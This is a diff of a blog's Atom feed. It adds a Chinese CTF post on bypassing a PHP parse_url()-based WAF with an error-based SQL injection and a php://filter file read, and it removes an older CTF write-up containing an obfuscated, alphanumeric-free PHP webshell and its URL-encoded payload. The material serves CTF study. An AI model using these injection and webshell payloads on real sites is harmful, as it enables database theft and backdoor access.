@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-04-20T11:18:47.117Z</updated>
+  <updated>2018-05-13T15:54:11.077Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>php parse_url()函数的漏洞</title>
+    <link href="http://yoursite.com/2018/05/13/parse_url/"/>
+    <id>http://yoursite.com/2018/05/13/parse_url/</id>
+    <published>2018-05-13T10:11:57.382Z</published>
+    <updated>2018-05-13T15:54:11.077Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="php-parse-url-函数的漏洞"><a href="#php-parse-url-函数的漏洞" class="headerlink" title="php parse_url()函数的漏洞"></a>php parse_url()函数的漏洞</h1><p><strong>在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤</strong></p><p><strong>来看代码</strong></p><pre><code>&lt;?php$url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);parse_str($url[&apos;query&apos;],$query);var_dump($query); ?&gt;</code></pre><p><strong>访问url：<a href="http://127.0.0.1/info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1/info/parseurl.php?sql=select</a></strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/acDbC5lEe8.png?imageslim" alt="mark"><br><strong>这里会是url中正常的参数值</strong></p><p><strong>如果访问url:<a href="http://127.0.0.1///info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1///info/parseurl.php?sql=select</a></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/EbCH4hKH9b.png?imageslim" alt="mark"><br><strong>这时将不能正常返回url中的参数值，遇到这样格式的连接，parse_url函数将会返回False，这种情况下可能会绕过某些waf的过滤</strong></p><p><strong>来看一道ctf题</strong></p><pre><code>http://118.126.113.78/web1/?id=1</code></pre><p><strong>已经确定id参数存在过滤，fuzz了一下，大概过滤了and,select,union,from等sql关键字，导致union注入和报错注入都失败，根据页面源代码的提示我们可以利用php伪协议读取出页面源代码看看它究竟是怎么样过滤的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/0I4Bkl3ibm.png?imageslim" alt="mark"><br><strong>利用php伪协议文件包含读取waf.php的源代码</strong>    </p><pre><code>http://118.126.113.78/web1/?file=php://filter/convert.base64-encode/resource=waf.php</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/fgjlla414b.png?imageslim" alt="mark"></p><pre><code>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRfR0VUPUFkZF9TKCRfR0VUKTsNCiRfUE9TVD1BZGRfUygkX1BPU1QpOw0KJF9DT09LSUU9QWRkX1MoJF9DT09LSUUpOw0KJF9SRVFVRVNUPUFkZF9TKCRfUkVRVUVTVCk7DQpmdW5jdGlvbiBBZGRfUygkYXJyYXkpDQp7DQpmb3JlYWNoKCRhcnJheSBhcyAka2V5PT4kdmFsdWUpew0KICAgICAgICAgICAgICAgIGlmKCFpc19hcnJheSgkdmFsdWUpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICRjaGVjaz0gcHJlZ19tYXRjaCgnL3JlZ2V4cHxhbmR8bGlrZXxcInwlfGluc2VydHx1cGRhdGV8ZGVsZXRlfHVuaW9ufGludG98bG9hZF9maWxlfG91dGZpbGV8XC9cKi9pJywgJHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjaGVjaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJIYWNrZXIhIik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICAkYXJyYXlbJGtleV09QWRkX1MoJGFycmF5WyRrZXldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCnJldHVybiAkYXJyYXk7DQp9DQoNCmZ1bmN0aW9uIE1lYXN1cmVtZW50X3VybCgpDQp7DQogICAgJHVybD1wYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgJEtleXdvcmQ9YXJyYXkoImZyb20iLCJzZWxlY3QiLCJsaWtlIiwib3IiKTsNCiAgICBmb3JlYWNoKCRxdWVyeSBhcyAka2V5KQ0KICB7DQogICAgICAgIGZvcmVhY2goJEtleXdvcmQgYXMgJHZhbHVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvIi4kdmFsdWUuIi8iLHN0cnRvbG93ZXIoJGtleSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGRpZSgiZnVjayB1ISIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4NCg==</code></pre><p><strong>base64解码后</strong></p><pre><code>&lt;?phperror_reporting(0);$_GET=Add_S($_GET);$_POST=Add_S($_POST);$_COOKIE=Add_S($_COOKIE);$_REQUEST=Add_S($_REQUEST);function Add_S($array){foreach($array as $key=&gt;$value){            if(!is_array($value)){                    $check= preg_match(&apos;/regexp|and|like|\&quot;|%|insert|update|delete|union|into|load_file|outfile|\/\*/i&apos;, $value);                    if($check)                            {                            exit(&quot;Hacker!&quot;);                    }            }else{                    $array[$key]=Add_S($array[$key]);            }    }return $array;}function Measurement_url(){    $url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);    parse_str($url[&apos;query&apos;],$query);    $Keyword=array(&quot;from&quot;,&quot;select&quot;,&quot;like&quot;,&quot;or&quot;);    foreach($query as $key)    {    foreach($Keyword as $value)    {        if(preg_match(&quot;/&quot;.$value.&quot;/&quot;,strtolower($key)))        {            die(&quot;fuck u!&quot;);        }    }}}?&gt;</code></pre><p><strong>可以看到其实是写了两个函数分别过滤的，其中<code>ADD_S</code>函数确实是将其里面定义的黑名单sql关键字过滤死了，但是<code>Measurement_url</code>函数中接收url参数值确是通过的<code>parse_url</code>这个函数，之前文章开头也讲到了，使用这个函数取url参数时，会因为url的格式出现一些问题导致该函数返回Flase而绕过过滤，所以我们确定了真正被过滤的关键字只有<code>ADD_S</code>中的那些关键字，而单单过滤这些关键字是不够的，这样我们便通过<code>parse_url</code>函数的漏洞去绕过黑名单的检查，最终读取flag的payload</strong></p><pre><code>http://118.126.113.78///web1/?id=1&apos; ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+</code></pre><p><strong>（对select，from的过滤就可以通过parse_url这个函数的漏洞绕过）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/3Lh2A7BimG.png?imageslim" alt="mark"></p><pre><code>XPATH syntax error: &apos;:flag{WE_ARe_FaMiLy!1234567}:&apos;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;php-parse-url-函数的漏洞&quot;&gt;&lt;a href=&quot;#php-parse-url-函数的漏洞&quot; class=&quot;headerlink&quot; title=&quot;php parse_url()函数的漏洞&quot;&gt;&lt;/a&gt;php parse_url()函数的漏洞&lt;/h1&gt;&lt;p&gt;
+      
+    
+    </summary>
+    
+      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
+    
+    
+      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
+    
+  </entry>
   
   <entry>
     <title>kali无线网卡wifi破解</title>
@@ -488,31 +513,6 @@
     
     
       <category term="dvwa学习" scheme="http://yoursite.com/tags/dvwa%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>湖湘杯2017网络安全技能大赛部分题writeup</title>
-    <link href="http://yoursite.com/2017/11/26/hxbctf2017/"/>
-    <id>http://yoursite.com/2017/11/26/hxbctf2017/</id>
-    <published>2017-11-25T16:01:10.287Z</published>
-    <updated>2017-11-26T03:27:36.809Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="湖湘杯2017网络安全技能大赛部分题writeup"><a href="#湖湘杯2017网络安全技能大赛部分题writeup" class="headerlink" title="湖湘杯2017网络安全技能大赛部分题writeup"></a>湖湘杯2017网络安全技能大赛部分题writeup</h1><p><strong>战队:nyisec</strong></p><h3 id="题目-web200"><a href="#题目-web200" class="headerlink" title="题目:web200"></a>题目:web200</h3><p><strong>解题思路:</strong><br>题目提醒是上传题,但是弄了半天，原来是文件包含,用<code>php://filter/convert.base64-encode/resource</code>就可以读取文件源码，我们读取flag的源码,使用<code>php://filter/convert.base64-encode/resource/flag</code>,读出的是一串base64编码</p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171126/43AC11AhKI.PNG" alt="mark"></p><p>解码一下就是flag，flag如图</p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171126/1h7eJJHf0A.PNG" alt="mark"></p><h3 id="题目-web300"><a href="#题目-web300" class="headerlink" title="题目:web300"></a>题目:web300</h3><p><strong>解题思路:</strong><br>题目没有绕什么弯，根据源码可以看出只要写了shell就能得到flag，我们将一句话写到get参数content后面，然后就会写入文件，但是根据题目我们只能用<code>$ , &#39; , ( , ) , + , . , ; , = , [ , ] , _ , { , }</code>这几个字符写webshell，别的字符都被过滤掉了，在网上搜了一下，p牛曾经写过一篇博客，根据php的特性如果要将一个空字符串和一个空数组连接起来的话就能生成一个字符串，值为Aarry，再用题目允许的字符将其中两个不相等的字符用==进行比较我们可以得到0，从而得到Aarry的第一个字符A，我们对A进行自加操作就能生成任意字母，从而写出符合要求的webshell，下面给出代码</p><pre><code>$_=[].&apos;&apos;;$_=$_[&apos;(&apos;==&apos;)&apos;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></pre><p>上面的代码很好的表示出了<code>ASSERT($_POST[_]);</code>一句话木马，密码为<code>_</code>.</p><p>因为+出现在url中会被当作是空格从而被waf过滤掉,所以将代码进行url编码后放到content参数后提交</p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171126/dHC3ldb66k.PNG" alt="mark"></p><p>最终payload</p><pre><code>http://114.215.133.202:10080/?content=%24%5f%3d%5b%5d%2e%27%27%3b%24%5f%3d%24%5f%5b%27%28%27%3d%3d%27%29%27%5d%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171126/a8dJLF554L.PNG" alt="mark"><br>点击我们的shell链接<br><img src="http://p008biu9n.bkt.clouddn.com/blog/171126/aHB90jmckA.PNG" alt="mark"><br>出现这样的情况就是上传成功</p><p>用菜刀连接就能看到flag.php<br><img src="http://p008biu9n.bkt.clouddn.com/blog/171126/dECKcFcHa5.png?imageslim" alt="mark"><br>flag<br><img src="http://p008biu9n.bkt.clouddn.com/blog/171126/0IEiKd6Eij.PNG" alt="mark"></p><p>给出p牛的文章链接<br><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" title="一些不包含数字和字母的webshell" target="_blank" rel="external">一些不包含数字和字母的webshell</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;湖湘杯2017网络安全技能大赛部分题writeup&quot;&gt;&lt;a href=&quot;#湖湘杯2017网络安全技能大赛部分题writeup&quot; class=&quot;headerlink&quot; title=&quot;湖湘杯2017网络安全技能大赛部分题writeup&quot;&gt;&lt;/a&gt;湖湘杯2017网络安全
-      
-    
-    </summary>
-    
-      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
-    
-    
-      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
     
   </entry>
   
